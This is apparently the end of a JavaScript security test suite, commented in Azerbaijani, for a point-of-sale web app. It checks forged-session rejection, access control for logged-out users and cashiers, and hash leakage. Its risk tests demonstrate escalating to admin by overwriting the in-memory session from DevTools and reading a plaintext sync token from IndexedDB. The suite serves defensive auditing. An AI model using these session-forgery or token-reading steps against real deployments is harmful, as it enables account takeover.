  await must('saxta sessiya (sessionStorage): uyğun olmayan barmaq izi / başqa istifadəçi / köhnə vaxt / söndürülmüş hesab → giriş bərpa olunmur', async () => {
    const store = {}; const ss = { getItem: k => (k in store ? store[k] : null), setItem: (k, v) => { store[k] = String(v); }, removeItem: k => { delete store[k]; } };
    const be2 = makeBackend({ token: TOKEN }); const idb = new IDBFactory();
    let d = makeDevice(be2, idb, { sessionStorage: ss }); await d.Services.init();
    const k = (await d.Services.listUsers()).find(x => x.name === 'Kassir');
    await d.Services.login(k.id, '1111'); await d.Services.changePin('1111', '4827'); const good = store['mag.session']; assert.ok(good);
    const g = JSON.parse(good);
    const cases = [{ id: 'u_admin', fp: g.fp, at: g.at }, { id: g.id, fp: 'deadbeefdeadbeef|admin', at: g.at }, { id: g.id, fp: g.fp, at: Date.now() - 13 * 3600000 }, { id: 'u_yoxdur', fp: g.fp, at: g.at }, { id: g.id, at: g.at }, { fp: g.fp, at: g.at }, 'xx', { id: {}, fp: 'a', at: 1 }, null];
    for (const c of cases) {
      store['mag.session'] = typeof c === 'string' ? c : JSON.stringify(c);
      d = makeDevice(be2, idb, { sessionStorage: ss }); await d.Services.init();
      assert.strictEqual(await d.Services.restoreSession(), null, 'qəbul olundu: ' + JSON.stringify(c));
    }
    store['mag.session'] = good; d = makeDevice(be2, idb, { sessionStorage: ss }); await d.Services.init();
    assert.strictEqual((await d.Services.restoreSession()).id, g.id, 'düzgün sessiya bərpa olunur');
  });

  await must('giriş etməyən istifadəçi heç bir qorunan əməliyyatı icra edə bilmir (bütün Services sınaqdan keçirilir)', async () => {
    const d = await boot(be); d.Services.logout();
    const ALLOWED = new Set(['init', 'storeInfo', 'listUsers', 'login', 'logout', 'currentUser', 'deviceId', 'requirePerm', 'getMatrix', 'sanitizeForRole', 'validateNewPin', 'restoreSession', 'EPOCH', '_session', 'outboxCount',
      'listConflicts', 'refreshSession', 'validateReturn', 'lastClosedShift', 'currentShift', 'checkApproval', 'findSaleByCode', 'returnedQtyBySale', 'recentSales', 'lookupForPos', 'listProducts', 'listPendingApprovals', 'productLots', 'stockBySupplier', 'supplierReport', 'listMyStockRequests', 'listSuppliers', 'shiftReport', 'listAllUsers', 'auditEvent',
      'setClockOffset', 'MAX_CART_LINES']);       // setClockOffset: yalnız yerli saat düzəlişi (sync çağırır, giriş yoxdur); sərhədlənib (±30 gün)
    const S = d.Services, open = [];
    for (const name of Object.keys(S)) {
      if (typeof S[name] !== 'function' || ALLOWED.has(name)) continue;
      let ok = false; try { await S[name]({}, {}, {}); ok = true; } catch (e) { ok = false; }
      if (ok) open.push(name);
    }
    assert.deepStrictEqual(open, [], 'girişsiz icra olunan funksiyalar: ' + open.join(', '));
  });

  await must('girişsiz çağırışlar məlumat qaytarmır: istifadəçi siyahısı yalnız id/ad/rol; hash/duz çıxmır', async () => {
    const d = await boot(be); d.Services.logout();
    const us = await d.Services.listUsers(); us.forEach(u => { assert.deepStrictEqual(Object.keys(u).sort(), ['cred', 'id', 'name', 'role']); assert.ok(u.cred === 'pin' || u.cred === 'password'); });   // cred: yalnız forma (hash/duz yox)
    const all = await d.Services.listAllUsers().then(x => x, e => 'rədd'); if (all !== 'rədd') all.forEach(u => assert.ok(!('pinHash' in u) && !('salt' in u), 'listAllUsers hash qaytarır'));
  });

  await must('Kassir Admin əməliyyatlarını icra edə bilmir: istifadəçi/icazə/PIN sıfırlama/mal qəbulu/təchizatçı/məhsul yaratma/qiymət', async () => {
    await loginAs(K, 'Kassir', '1111').catch(() => {}); const u = K.Services.currentUser(); assert.ok(u);
    const adm = (await K.Services.listUsers()).find(x => x.name === 'Admin');
    const tries = [() => K.Services.createUser({ name: 'Hacker', role: 'admin' }), () => K.Services.updateUser(adm.id, { role: 'kassir' }), () => K.Services.resetPin(adm.id),
      async () => { const m = await K.Services.getMatrix(); m.kassir.push('admin.permissions'); return K.Services.setMatrix(m); },
      () => K.Services.receiveStock(toy.id, 1, 1, '', null), () => K.Services.createSupplier({ name: 'Saxta' }), () => K.Services.createProduct({ name: 'Y', price: 1, cost: 1 }),
      () => K.Services.updateProduct(toy.id, { price: 1 }), () => K.Services.setStoreInfo({ name: 'Hack' }), () => K.Services.seedDemoProducts()];
    for (let i = 0; i < tries.length; i++) { let ok = false; try { await tries[i](); ok = true; } catch (e) { ok = false; } assert.strictEqual(ok, false, 'Kassir icra etdi: əməliyyat #' + i); }
    assert.strictEqual((await K.Services.listAllUsers().then(x => x, () => [])).length, 0, 'Kassir bütün istifadəçiləri görə bilmir');
  });

  /* ===================== E. Yerli (cihazdakı) hücum ===================== */
  console.log('\n— E. Cihaz üzərində brauzer alətləri (DevTools) olan şəxs —');
  await risk('RİSK-7 Cihaza fiziki/DevTools girişi olan şəxs PIN-siz Admin ola bilər (IndexedDB-də bütün hash-lar, Services._session açıqdır)', async () => {
    const d = await boot(be); d.Services.logout();
    d.Services._session.user = { id: 'u_admin', name: 'Admin', role: 'admin' };
    let ok = false; try { const r = await d.Services.createUser({ name: 'Yerli-Hack', role: 'admin' }); ok = !!(r && r.tempPin); } catch (e) { ok = false; }
    return { exploited: ok, detail: ok ? 'konsoldan Admin yaradıldı. Brauzerdəki kod hücumçunun nəzarətindədir, bunu yalnız cihazı kilidləmək/kiosk rejimi azaldır' : '' };
  });

  await risk('RİSK-8 Token cihazın IndexedDB-sində düz mətn saxlanılır (eyni mənşəli istənilən skript oxuya bilər)', async () => {
    const m = await K.DB.get('meta', 'syncToken');
    return { exploited: !!(m && m.value === TOKEN), detail: 'meta.syncToken düz mətn; GitHub Pages-də eyni hesabdakı başqa saytlar eyni mənşəni (origin) paylaşır' };
  });

  console.log(`\n${passed} müdafiə/yoxlama keçdi, ${failed} uğursuz, ${risks} açıq risk (hesabata düşür)`);
  fs.writeFileSync(path.join(process.env.SEC_OUT || require('os').tmpdir(), 'security-findings.json'), JSON.stringify(findings, null, 1));
  process.exit(failed ? 1 : 0);
})();
